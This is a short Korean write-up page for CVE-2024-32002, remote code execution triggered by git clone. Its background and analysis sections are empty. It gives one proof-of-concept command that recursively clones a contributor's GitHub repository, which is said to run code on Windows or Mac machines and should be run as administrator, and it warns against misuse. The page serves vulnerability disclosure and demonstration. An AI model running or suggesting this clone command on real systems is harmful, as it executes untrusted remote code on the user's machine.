# git clone을 통한 Remote Code Execution 공격 (CVE-2024-32002)

<strong>기여자</strong>
<br/>

-   [이정우@Roronoawjd](https://github.com/Roronoawjd)
<br/>

## 배경 설명



## 참고
- 해당 POC는 Windows와 MAC 시스템에서만 동작합니다.
- `git config --global core.symlinks false`로 설정된 경우에는 공격이 작동하지 않습니다.



## 취약점 정보




## 취약점 분석






## POC(Proof of Concept)
⚠️경고: 해당 취약점을 악의적으로 사용하지 마시오!
<pre><code>git clone --recursive https://github.com/Roronoawjd/git_rce.git</code></pre>
참고: Windows에서는 관리자 권한으로 cmd나 bash쉘을 열어서 실행해야 합니다.

